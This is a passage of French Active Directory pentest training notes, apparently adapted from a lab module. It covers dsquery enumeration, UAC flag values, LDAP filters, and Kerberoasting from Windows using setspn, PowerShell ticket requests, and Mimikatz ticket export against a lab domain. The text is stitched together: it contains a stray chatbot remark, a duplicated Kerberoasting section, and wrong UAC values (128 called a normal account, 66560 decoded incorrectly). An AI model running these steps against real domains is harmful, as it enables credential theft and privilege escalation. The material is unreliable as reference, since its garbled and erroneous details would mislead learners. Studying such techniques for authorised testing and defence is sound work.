Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *File Share G Drive   *File Share H Drive
                             *Warehouse            *Printer Access
                             *Domain Users         *VPN Users
                             *Shared Calendar Read
The command completed successfully.
```


### Dsquery

Dsquery est un outil de ligne de commande utile qui peut être utilisé pour trouver des objets Active Directory. Les requêtes que nous exécutons avec cet outil peuvent être facilement reproduites avec des outils comme BloodHound et PowerView, mais nous n'avons pas toujours ces outils à notre disposition, comme mentionné au début de la section. Cependant, il est probable que les administrateurs système de domaine utilisent cet outil dans leur environnement. Avec cela en tête, dsquery existera sur tout hôte avec le rôle Active Directory Domain Services installé, et la DLL dsquery existe par défaut sur tous les systèmes Windows modernes et peut être trouvée à `C:\Windows\System32\dsquery.dll`.

#### Dsquery DLL

Tout ce dont nous avons besoin, ce sont des privilèges élevés sur un hôte ou la capacité d'exécuter une instance de l'invite de commande ou de PowerShell à partir d'un contexte SYSTEM. Ci-dessous, nous montrerons la fonction de recherche de base avec dsquery et quelques filtres de recherche utiles.


#### User Search

```powershell
PS C:\htb> dsquery user

"CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=lab_adm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Htb Student,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Annie Vazquez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Paul Falcon,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Fae Anthony,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Walter Dillard,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Louis Bradford,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Sonya Gage,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Alba Sanchez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Daniel Branch,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Christopher Cruz,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Nicole Johnson,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Mary Holliday,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Michael Shoemaker,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Arlene Slater,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Kelsey Prentiss,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
```


#### Computer Search


```powershell
PS C:\htb> dsquery computer

"CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ACADEMY-EA-MS01,OU=Web Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ACADEMY-EA-MX01,OU=Mail,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=SQL01,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ILF-XRG,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=MAINLON,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=CISERVER,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=INDEX-DEV-LON,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=SQL-0253,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0615,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0616,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0617,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0618,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0619,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0620,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0621,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0622,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0623,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LON-0455,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LON-0456,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LON-0457,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LON-0458,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
```

#### Recherche par Joker

```powershell
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

"CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Computers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Cert Publishers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Guests,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Group Policy Creator Owners,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=RAS and IAS Servers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Allowed RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Denied RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Enterprise Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Cloneable Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Enterprise Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=DnsAdmins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=DnsUpdateProxy,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=certsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

#### Users With Specific Attributes Set (PASSWD_NOTREQD)

```powershell
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

  distinguishedName                                                                              userAccountControl
  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    66082
  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL      66080
  CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                           546
  CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           544
  CN=LOGISTICS$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               2080
  CN=FREIGHTLOGISTIC$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                         2080
```

#### Valeurs UAC

##### Valeurs des Bits du Contrôle de Compte Utilisateur

Le Contrôle de Compte Utilisateur (UAC) dans Windows utilise des valeurs spécifiques pour définir les permissions et restrictions appliquées aux comptes. Ces valeurs sont stockées dans l'attribut `userAccountControl` dans Active Directory et peuvent être décodées pour comprendre les propriétés d'un compte utilisateur.

###### Valeurs UAC en Décimal

| Valeur Décimale | Description                                                                     |
|------------------|---------------------------------------------------------------------------------|
| `1`              | Script : Un script de connexion est exécuté.                                  |
| `2`              | Compte Désactivé : Le compte utilisateur est désactivé.                       |
| `8`              | Répertoire Personnel Requis : Un répertoire personnel est requis pour ce compte. |
| `16`             | Verrouillage : Le compte est actuellement verrouillé.                         |
| `32`             | Mot de Passe Non Requis : Aucun mot de passe n'est requis pour ce compte.     |
| `128`            | Compte Normal : Un compte utilisateur standard.                               |
| `256`            | Compte de Confiance Inter-Domaine : Un compte de confiance pour un domaine.   |
| `512`            | Compte de Confiance de Poste de Travail : Un compte d'ordinateur pour un poste de travail ou un serveur. |
| `2048`           | Mot de Passe Non Expiré : Le mot de passe du compte n'expire pas.             |
| `4096`           | Compte de Connexion MNS : Un compte de connexion MNS (Message Number Service). |
| `8192`           | Carte à Puce Requise : Une carte à puce est requise pour la connexion.        |
| `16384`          | Délégué de Confiance : Le compte est de confiance pour la délégation.         |
| `32768`          | Non Délégué : Le compte est sensible et ne peut pas être délégué.             |
| `65536`          | Utiliser Uniquement la Clé DES : Le compte ne peut utiliser que des types de chiffrement DES pour Kerberos. |
| `131072`         | Préauthentification Non Requise : Le compte ne nécessite pas de préauthentification Kerberos. |
| `262144`         | Mot de Passe Expiré : Le mot de passe du compte a expiré.                     |
| `524288`         | Délégué Authentifié de Confiance : Le compte est de confiance pour s'authentifier lors de la délégation. |

##### Exemple d'Utilisation

Pour décoder l'attribut `userAccountControl`, vous pouvez utiliser PowerShell ou d'autres outils de script pour extraire et analyser la valeur. Chaque bit représente une propriété spécifique, et la valeur combinée indique la configuration globale du compte.

##### Exemple :
- Une valeur `userAccountControl` de `66560` correspond à :
  - Compte Normal (`128`)
  - Mot de Passe Non Expiré (`2048`)
  - Carte à Puce Requise (`8192`)
  - Non Délégué (`32768`).

Comprendre ces valeurs permet d'évaluer et de gérer les paramètres de sécurité des comptes dans un environnement Active Directory.


Je comprends maintenant que vous souhaitez l'intégralité du texte en format Markdown, y compris la partie finale. Voici la version complète en français dans un fichier Markdown (.md) :

#### Correspondance des chaînes OID

Les OID (Object Identifiers) sont des règles utilisées pour faire correspondre les valeurs binaires avec des attributs, comme mentionné ci-dessus. Pour LDAP et AD (Active Directory), il existe trois principales règles de correspondance :

##### 1.2.840.113556.1.4.803

Lorsque cette règle est utilisée, comme dans l'exemple ci-dessus, cela signifie que la valeur binaire doit correspondre complètement pour répondre aux exigences de recherche. Cela est idéal pour la correspondance d'un attribut unique.

##### 1.2.840.113556.1.4.804

Lors de l'utilisation de cette règle, cela signifie que nous voulons que les résultats montrent toute correspondance d'attribut si un bit dans la chaîne correspond. Cela fonctionne dans le cas où un objet a plusieurs attributs définis.

##### 1.2.840.113556.1.4.1941

Cette règle est utilisée pour faire correspondre les filtres qui s'appliquent au Distinguished Name (DN) d'un objet et recherche à travers toutes les entrées de propriété et d'appartenance.

### Opérateurs Logiques

Lors de la construction de chaînes de recherche, nous pouvons utiliser des opérateurs logiques pour combiner les valeurs de recherche. Les opérateurs `&`, `|` et `!` sont utilisés à cette fin. Par exemple, nous pouvons combiner plusieurs critères de recherche avec l'opérateur `&` (et) comme suit :

```ldap
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
```

L'exemple ci-dessus définit le premier critère selon lequel l'objet doit être un utilisateur et le combine avec la recherche d'une valeur de bit UAC (User Account Control) de 64 (Le mot de passe ne peut pas être modifié). Un utilisateur ayant cet attribut défini correspondrait au filtre. Vous pouvez aller encore plus loin et combiner plusieurs attributs comme suit :

(&(1)(2)(3))

Les opérateurs ! (non) et | (ou) peuvent fonctionner de manière similaire. Par exemple, notre filtre ci-dessus peut être modifié comme suit :

(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))

Cela rechercherait n'importe quel objet utilisateur qui n'a pas l'attribut "Le mot de passe ne peut pas être modifié" défini. Lorsqu'on pense aux utilisateurs, groupes et autres objets dans Active Directory (AD), notre capacité à effectuer des recherches avec des requêtes LDAP est assez étendue.

Beaucoup de choses peuvent être faites avec les filtres UAC, les opérateurs et la correspondance d'attributs avec les règles OID. Pour l'instant, cette explication générale devrait suffire pour couvrir ce module. Pour plus d'informations et une exploration plus approfondie de l'utilisation de ce type de recherche par filtre, consultez le module LDAP Active Directory.

Utilisation de notre point d'accès pour l'énumération avec des outils

Nous avons maintenant utilisé notre point d'accès pour effectuer une énumération avec des informations d'identification via des outils sur des hôtes Linux et Windows, en utilisant des outils intégrés et des informations validées sur les hôtes et les domaines. Nous avons prouvé que nous pouvons accéder aux hôtes internes, que le "password spraying" et l'empoisonnement LLMNR/NBT-NS fonctionnent, et que nous pouvons utiliser des outils déjà présents sur les hôtes pour effectuer nos actions.

Maintenant, nous allons aller plus loin et aborder une TTP (Tactique, Technique, Procédure) que tout pentester AD devrait avoir dans sa boîte à outils : Kerberoasting.

```powershell
PS C:\Tools> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -attr description
```

## Cooking with the Fire

### Kerberoasting from Linux

#### Notre énumération jusqu'à présent

Notre énumération jusqu'à ce point nous a donné une vue d'ensemble du domaine et des problèmes potentiels. Nous avons énuméré les comptes utilisateurs et pouvons voir que certains sont configurés avec des noms principaux de service (SPN). Voyons comment nous pouvons exploiter cela pour nous déplacer latéralement et escalader les privilèges dans le domaine cible.

###### Vue d'ensemble du Kerberoasting

Le **Kerberoasting** est une technique de mouvement latéral et d'escalade de privilèges dans les environnements Active Directory. Cette attaque cible les comptes associés aux **Service Principal Names** (SPN). Les SPN sont des identifiants uniques que Kerberos utilise pour associer une instance de service à un compte de service sous lequel le service s'exécute. Les comptes de domaine sont souvent utilisés pour exécuter des services afin de contourner les limitations d'authentification réseau des comptes intégrés tels que **NT AUTHORITY\LOCAL SERVICE**. Tout utilisateur de domaine peut demander un ticket Kerberos pour n'importe quel compte de service dans le même domaine. Cela est également possible à travers les relations de confiance entre forêts si l'authentification est autorisée à travers cette frontière de confiance. 

Tout ce dont vous avez besoin pour effectuer une attaque Kerberoasting est le mot de passe en clair (ou le hachage NTLM) d'un compte, un shell dans le contexte d'un compte utilisateur de domaine, ou un accès de niveau SYSTEM sur un hôte joint au domaine.

Les comptes de domaine exécutant des services sont souvent des administrateurs locaux, sinon des comptes de domaine hautement privilégiés. En raison de la nature distribuée des systèmes, des services interagissant et des transferts de données associés, les comptes de service peuvent se voir accorder des privilèges d'administrateur sur plusieurs serveurs dans l'entreprise. De nombreux services nécessitent des privilèges élevés sur divers systèmes, c'est pourquoi les comptes de service sont souvent ajoutés à des groupes privilégiés, tels que **Domain Admins**, soit directement, soit via une appartenance imbriquée. Trouver des SPN associés à des comptes hautement privilégiés dans un environnement Windows est très courant.

Récupérer un ticket Kerberos pour un compte avec un SPN ne permet pas en soi d'exécuter des commandes dans le contexte de ce compte. Cependant, le ticket (TGS-REP) est crypté avec le hachage NTLM du compte de service, de sorte que le mot de passe en clair peut potentiellement être obtenu en soumettant ce ticket à une attaque par force brute hors ligne avec un outil tel que **Hashcat**.

Les comptes de service sont souvent configurés avec des mots de passe faibles ou réutilisés pour simplifier l'administration, et parfois le mot de passe est identique au nom d'utilisateur. Si le mot de passe d'un compte de service de serveur SQL de domaine est déchiffré, vous vous retrouverez probablement en tant qu'administrateur local sur plusieurs serveurs, voire même administrateur de domaine. Même si le déchiffrement d'un ticket obtenu via une attaque Kerberoasting donne un compte utilisateur à faibles privilèges, nous pouvons l'utiliser pour fabriquer des tickets de service pour le service spécifié dans le SPN. Par exemple, si le SPN est défini sur **MSSQL/SRV01**, nous pouvons accéder au service MSSQL en tant que **sysadmin**, activer la procédure étendue **xp_cmdshell** et obtenir l'exécution de code sur le serveur SQL cible.

Pour un aperçu intéressant de l'origine de cette technique, consultez la présentation de **Tim Medin** donnée lors de **Derbycon 2014**, où il a présenté le Kerberoasting au monde.


#### Kerberoasting - Réalisation de l'attaque

Selon votre position dans un réseau, cette attaque peut être réalisée de plusieurs manières :

- Depuis un hôte Linux non joint au domaine en utilisant des identifiants valides d'utilisateur de domaine.
- Depuis un hôte Linux joint au domaine en tant que root après avoir récupéré le fichier **keytab**.
- Depuis un hôte Windows joint au domaine authentifié en tant qu'utilisateur de domaine.
- Depuis un hôte Windows joint au domaine avec un shell dans le contexte d'un compte de domaine.
- En tant que **SYSTEM** sur un hôte Windows joint au domaine.
- Depuis un hôte Windows non joint au domaine en utilisant **runas /netonly**.

Plusieurs outils peuvent être utilisés pour réaliser l'attaque :

- **Impacket’s GetUserSPNs.py** depuis un hôte Linux non joint au domaine.
- Une combinaison du binaire Windows intégré **setspn.exe**, PowerShell et Mimikatz.
- Depuis Windows, en utilisant des outils tels que **PowerView**, **Rubeus** et d'autres scripts PowerShell.

Obtenir un ticket **TGS** via Kerberoasting ne garantit pas l'obtention de credentials valides, et le ticket doit toujours être craqué hors ligne avec un outil tel que **Hashcat** pour obtenir le mot de passe en clair. Les tickets **TGS** prennent plus de temps à être craqués que d'autres formats tels que les hachages **NTLM**, donc souvent, à moins qu'un mot de passe faible soit défini, il peut être difficile, voire impossible, d'obtenir le mot de passe en clair en utilisant un équipement standard de craquage.

#### Efficacité de l'attaque

Bien que cela puisse être un excellent moyen de se déplacer latéralement ou d'escalader les privilèges dans un domaine, le **Kerberoasting** et la présence de **SPN** ne garantissent pas un quelconque niveau d'accès. Nous pourrions nous trouver dans un environnement où nous craquons un ticket **TGS** et obtenons immédiatement un accès **Domain Admin**, ou obtenir des credentials qui nous aident à avancer sur le chemin de la compromission du domaine. D'autres fois, nous pourrions réaliser l'attaque et récupérer de nombreux tickets **TGS**, dont certains que nous pouvons craquer, mais aucun de ceux qui sont craqués ne correspond à des utilisateurs privilégiés, et l'attaque ne nous donne aucun accès supplémentaire.

Dans les deux premiers cas, je rédigerais probablement la découverte comme étant à haut risque dans mon rapport. Dans le troisième cas, nous pourrions réaliser un **Kerberoasting** et ne pas réussir à craquer un seul ticket **TGS**, même après des jours d'essais de craquage avec **Hashcat** sur une machine puissante de craquage de mots de passe GPU. Dans ce scénario, je rédigerais toujours la découverte, mais je la classerais comme un problème à risque moyen pour avertir le client du risque que représentent les **SPN** dans le domaine (ces mots de passe forts pourraient toujours être changés pour quelque chose de plus faible, ou un attaquant très déterminé pourrait être capable de craquer les tickets en utilisant **Hashcat**), tout en tenant compte du fait que je n'ai pas pu prendre le contrôle de comptes de domaine en utilisant l'attaque.

Il est essentiel de faire ces distinctions dans nos rapports et de savoir quand il est acceptable de réduire le risque d'une découverte lorsque des contrôles de mitigation (comme des mots de passe très forts) sont en place.

##### Réalisation de l'attaque

Les attaques de **Kerberoasting** sont désormais facilement réalisées à l'aide d'outils et de scripts automatisés. Nous allons aborder la réalisation de cette attaque de différentes manières, à la fois depuis un hôte Linux et un hôte Windows attaqué. Commençons par expliquer comment procéder depuis un hôte Linux. La section suivante détaillera une méthode "semi-manuelle" pour réaliser l'attaque, ainsi que deux attaques rapides et automatisées utilisant des outils open-source courants, le tout depuis un hôte Windows attaqué.

### Kerberoasting from Windows

#### Méthode semi-manuelle de Kerberoasting

Avant l'existence d'outils comme Rubeus, le vol ou la falsification de tickets Kerberos était un processus complexe et manuel. Au fur et à mesure que les tactiques et les défenses ont évolué, il est désormais possible de réaliser un Kerberoasting à partir de Windows de plusieurs manières. Nous allons commencer par explorer la méthode manuelle, puis passer à des outils plus automatisés. Commençons par utiliser l'outil intégré `setspn` pour énumérer les SPN (Service Principal Names) dans le domaine.

###### Énumération des SPN avec setspn.exe

###### Kerberoasting - depuis Windows

```bash
C:\htb> setspn.exe -Q */*
```

Cela permet d'énumérer les SPN dans le domaine spécifié. L'outil retourne plusieurs SPN associés à différents comptes et services dans le domaine. Nous nous concentrerons sur les comptes utilisateurs et ignorerons les comptes d'ordinateurs retournés par l'outil.

###### Exemple de sortie

```
Vérification du domaine DC=INLANEFREIGHT,DC=LOCAL
CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
        exchangeAB/ACADEMY-EA-DC01
        exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        TERMSRV/ACADEMY-EA-DC01
        TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL

<SNIP>

CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        backupjob/veam001.inlanefreight.local
CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        sts/inlanefreight.local

<SNIP>

CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SPSJDB.inlanefreight.local:1433
CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        adfsconnect/azure01.inlanefreight.local
```

Nous pouvons voir plusieurs SPN retournés pour différents hôtes dans le domaine. Nous nous concentrerons sur les comptes utilisateurs et ignorerons les comptes d'ordinateurs retournés par l'outil.

##### Cibler un utilisateur spécifique

Une fois les SPN énumérés, nous pouvons utiliser PowerShell pour demander des tickets TGS (Ticket Granting Service) pour un compte spécifique et les charger en mémoire. Ensuite, nous pouvons extraire ces tickets en utilisant Mimikatz. Voici un exemple pour cibler un utilisateur spécifique :

##### Exemple PowerShell

```powershell
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

###### Explication des commandes

1. **Add-Type** : Cette commande ajoute une classe du framework .NET à notre session PowerShell, ce qui permet de l'instancier comme n'importe quel objet du framework .NET.
2. **-AssemblyName** : Ce paramètre permet de spécifier l'assemblée contenant les types que nous souhaitons utiliser.
3. **System.IdentityModel** : Il s'agit d'un espace de noms contenant des classes pour créer des services de jetons de sécurité.
4. **New-Object** : Utilisé pour créer une instance d'un objet du framework .NET.
5. **KerberosRequestorSecurityToken** : Cette classe est utilisée pour créer un jeton de sécurité Kerberos et demander un ticket TGS pour le compte cible.

Nous pouvons également choisir de récupérer tous les tickets avec cette méthode, mais cela inclurait également les comptes d'ordinateurs, ce qui n'est pas optimal.

#### Résumé

La méthode semi-manuelle de Kerberoasting consiste à énumérer les SPN dans un domaine, puis à cibler un utilisateur spécifique pour obtenir des tickets TGS via PowerShell. Ces tickets peuvent ensuite être extraits avec Mimikatz. Cette méthode est la base de ce qui est automatisé par des outils comme Rubeus, mais elle reste utile pour comprendre le fonctionnement de Kerberoasting à un niveau plus fondamental.

## Kerberoasting from Windows

### Kerberoasting - Semi-Manual Method

Avant l'existence d'outils comme Rubeus, le vol ou la falsification de tickets Kerberos était un processus complexe et manuel. Aujourd'hui, les tactiques et les défenses ayant évolué, nous pouvons effectuer du Kerberoasting depuis Windows de différentes manières. Cet article explore d'abord la méthode manuelle, puis les outils automatisés.

---

## Énumération des SPN avec `setspn.exe`

### Commande utilisée :
```cmd
C:\htb> setspn.exe -Q */*
```

### Résultats :

```plaintext
Checking domain DC=INLANEFREIGHT,DC=LOCAL
CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
        exchangeAB/ACADEMY-EA-DC01
        exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        TERMSRV/ACADEMY-EA-DC01
        TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL

<SNIP>

CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        backupjob/veam001.inlanefreight.local
CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        sts/inlanefreight.local

<SNIP>

CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SPSJDB.inlanefreight.local:1433
CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        adfsconnect/azure01.inlanefreight.local

Existing SPN found!
```

Nous observons différents SPN renvoyés pour divers hôtes dans le domaine. Nous nous concentrons sur les comptes utilisateurs et ignorons les comptes machines retournés.

---

## Ciblage d'un Utilisateur Unique

### Commandes PowerShell :
```powershell
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

### Résultat :
```plaintext
Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:36:22 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

---

## Récupération de Tous les Tickets

### Commande PowerShell :
```powershell
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

### Résultat :
```plaintext
Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-3
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:56:18 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : exchangeAB/ACADEMY-EA-DC01
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

<SNIP>
```

---

## Extraction des Tickets avec Mimikatz

### Commandes Mimikatz :
```plaintext
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

### Exemple de Résultat :
```plaintext
[00000002] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
   Client Name       : htb-student @ INLANEFREIGHT.LOCAL
